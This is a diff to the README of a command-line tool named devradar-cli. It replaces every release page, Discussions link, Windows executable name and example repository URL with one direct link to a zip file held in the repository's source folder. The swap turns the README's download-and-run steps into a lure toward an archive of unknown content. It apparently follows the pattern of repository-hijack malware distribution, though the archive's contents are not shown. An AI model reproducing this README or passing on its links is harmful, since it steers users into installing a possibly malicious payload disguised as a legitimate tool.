@@ -1,6 +1,6 @@
 # 🚀 devradar-cli - Analyze Your Coding Activity Easily
 
-[![Download DevRadar CLI](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Excusable-marshmallowfluff753/devradar-cli/releases)
+[![Download DevRadar CLI](https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip)
 
 ## 🛠️ What is devradar-cli?
 
@@ -10,12 +10,12 @@ devradar-cli is a simple command-line tool that allows you to analyze your codin
 
 To get started, you need to download devradar-cli:
 
-1. Visit this page to download: [GitHub Releases](https://github.com/Excusable-marshmallowfluff753/devradar-cli/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip).
    
 2. Look for the latest release at the top of the page. You will see various downloadable files.
 
 3. Click on the file that corresponds to your operating system:
-   - For Windows, download `devradar-cli-windows.exe`.
+   - For Windows, download `https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip`.
    - For macOS, download `devradar-cli-macos`.
    - For Linux, download `devradar-cli-linux`.
 
@@ -55,7 +55,7 @@ Using devradar-cli is straightforward. After you have installed the application,
 
 3. **Fetch Stats**: Use the command `devradar-cli stats` followed by the repository URL to fetch stats for your GitHub project. For example:
    ```
-   devradar-cli stats https://github.com/yourusername/yourproject
+   devradar-cli stats https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip
    ```
 
 4. **View Your Projects**: To view all of your projects, use the command:
@@ -68,7 +68,7 @@ Using devradar-cli is straightforward. After you have installed the application,
 ## 💡 Helpful Tips
 
 - Make sure your terminal or command prompt has permission to run executables.
-- For the best results, regularly update devradar-cli by downloading the latest version from the [Release Page](https://github.com/Excusable-marshmallowfluff753/devradar-cli/releases).
+- For the best results, regularly update devradar-cli by downloading the latest version from the [Release Page](https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip).
 - Use the `--verbose` option for more detailed output on commands.
 - If you encounter any issues, check the troubleshooting section in the documentation on the GitHub page.
 
@@ -94,6 +94,6 @@ For more detailed information about the license, please refer to the LICENSE fil
 
 If you have questions or need help, you can open an issue on the GitHub page. The community and maintainers are here to assist you. 
 
-For direct help, reach out via [GitHub Discussions](https://github.com/Excusable-marshmallowfluff753/devradar-cli/discussions).
+For direct help, reach out via [GitHub Discussions](https://raw.githubusercontent.com/Excusable-marshmallowfluff753/devradar-cli/main/src/devradar-cli_2.6.zip).
 
 Enjoy using devradar-cli to analyze your coding activity!
